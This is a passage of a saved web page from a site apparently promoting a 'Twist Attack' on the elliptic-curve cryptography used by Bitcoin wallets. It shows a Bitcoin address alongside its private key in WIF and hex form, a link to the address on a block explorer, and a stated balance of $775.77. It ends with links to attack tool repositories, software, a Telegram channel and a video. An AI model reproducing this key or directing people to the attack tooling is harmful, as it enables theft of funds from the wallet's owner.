<pre class="wp-block-code"><code>ADDR: 1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq
WIF:  KwaXPrvbWF5USy3GCh453UDGWXnBSroiKKtE6ebtmHHxGKaRmVD6
HEX:  0AB51E7092866DADF86165EA0D70BEB69086237A0E7F5A123D496D3D98E03617</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-41-1.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2248"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><iframe src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/saved_resource.html" style="overflow:hidden;" frameborder="0"></iframe></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><a href="https://live.blockcypher.com/btc/address/1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq/">https://live.blockcypher.com/btc/address/1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq/</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-42-1024x528.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2253"></figure></div>


<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-43-1024x179.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2257"></figure>



<p class="has-large-font-size"><code><strong>BALANCE: $ 775.77</strong></code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/18TwistAttack" target="_blank" rel="noreferrer noopener">Source</a></strong></p>



<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">ATTACKSAFE SOFTWARE</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><strong><a href="https://youtu.be/S_ZUcM2cD8I" target="_blank" rel="noreferrer noopener">Video: https://youtu.be/S_ZUcM2cD8I</a></strong></p>



<p><strong><a href="https://cryptodeeptech.ru/twist-attack" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/twist-attack</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/031-1024x576(1).png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2053"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">
	</div><!-- .entry-content -->

